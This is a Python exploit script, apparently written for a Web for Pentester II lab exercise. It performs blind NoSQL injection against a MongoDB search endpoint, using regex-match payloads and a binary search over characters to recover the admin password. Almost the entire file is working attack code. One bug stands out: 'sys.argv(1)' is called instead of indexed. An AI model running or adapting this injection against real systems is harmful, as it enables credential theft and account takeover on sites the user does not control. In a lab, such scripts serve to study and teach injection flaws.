import requests, sys,urllib3, math
from bs4 import BeautifulSoup

wfp2_site = sys.argv(1)

class BruteForcePassword(object):
    def query_website(self,search_string):
        '''
        Queries the website repeatedly using the requests library
        and then searches for the user in the html returned.
        '''
        url=f'''http://{wfp2_site}/mongodb/example2/'''
        value='admin\' && this.password.match(/^{0}[{1}]/)//'.format(self.password,search_string)
        payload={'search':value}
        resp = requests.get(url,params=payload)
        soup = BeautifulSoup(resp.text,'html.parser')  
        if('admin' in soup.find('table').getText()):
            if len(search_string)==1:
                self.password+=search_string                                    
            return True                                                        
        else:                                                                           
            return False

    def search_for_password(self,low,mid,high,search_string):
        '''
        Performs a binary search for a charachter of a password
        by dividing the charachter set repeatedly until the password
        has been found.After finding the password charachter returns
        '''
        while True:
            if self.query_website(search_string[low:mid]):
                high=mid
                mid=int((low+high)/2)
                if low==mid:
                    return 0
            else:
                low=mid
                mid=math.ceil(int((low+high)/2))
                if low==mid==high:
                    return -1
                if low==mid:
                    mid+=1

    def brute_force_search(self):
        '''
        Performs a brute force search for a charachter of the password
        and then calls the search method repeatedly until the entire
        password is found.
        '''
        search_string="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        self.password=""
        low=0
        high=len(search_string)
        mid=int((low+high)/2)
        while(True):
            val=self.search_for_password(low,mid,high,search_string)
            if val==-1:
                break
        return self.password
        
sol=BruteForcePassword()
print(sol.brute_force_search())
